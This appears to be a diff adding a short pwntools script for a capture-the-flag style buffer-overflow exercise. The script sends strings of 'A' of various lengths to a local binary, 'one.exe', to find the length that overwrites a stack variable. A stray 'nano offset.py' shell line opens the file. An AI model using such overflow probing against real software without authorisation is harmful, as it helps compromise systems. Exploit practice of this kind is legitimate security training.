@@ -1,0 +1,31 @@
+nano offset.py       
+from pwn import *
+
+def solve():
+    # Based on rbp-0x50 and rbp-0x54, try these specific offsets  (depends)
+    # In many challenges, the answer is the distance between the two (4)
+    # OR the total buffer size (80 or 84)
+    offsets = [4, 60, 64, 76, 80, 84, 112]
+    
+    for i in offsets:
+        p = process('./one.exe', level='error')
+        p.sendline(b'A' * i)
+        try:
+            out = p.recvall(timeout=0.2)
+            if b"Try again" not in out and out != b"":
+                print(f"[!] FOUND! Length {i} changed the variable.")
+                print(f"Output: {out.decode()}")
+                p.close()
+                return
+        except:
+            pass
+        p.close()
+
+    print("Checking for byte-by-byte changes...")
+    # Manual check for the most likely answer: 80 characters
+    # 0x50 hex is 80 decimal.
+    p = process('./one.exe')
+    p.sendline(b'A' * 80)
+    print(f"Result for 80 chars: {p.recvall(timeout=0.5)}")
+
+solve()
